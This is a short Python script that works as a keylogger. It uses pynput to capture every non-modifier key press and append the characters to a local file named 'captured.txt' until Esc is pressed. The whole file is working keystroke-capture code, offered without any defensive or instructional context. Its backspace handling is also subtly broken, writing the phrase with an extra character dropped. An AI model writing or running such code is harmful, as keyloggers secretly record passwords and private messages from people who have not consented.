from pynput import keyboard


IGNORE = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd
}

FILENAME = 'captured.txt'
phrase = ''
KEY_TO_INTERRUPT = keyboard.Key.esc

def on_press(key):
    global phrase
    try:
        if key not in IGNORE:
            with open(FILENAME, 'a', encoding='utf-8') as file:
                if key == keyboard.Key.enter:
                    file.write(f'\n')
                    phrase = ''
                elif key == keyboard.Key.space:
                    phrase += ' '
                    file.write(' ')
                elif key == keyboard.Key.backspace:
                    phrase = phrase[:len(phrase)-1]
                    file.write(f'\n{phrase[:len(phrase)-1]}')
                elif key == KEY_TO_INTERRUPT:
                    return False
                else:
                    phrase += key.char
                    file.write(key.char)

    except AttributeError:
        print(key)



if __name__ == '__main__':
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
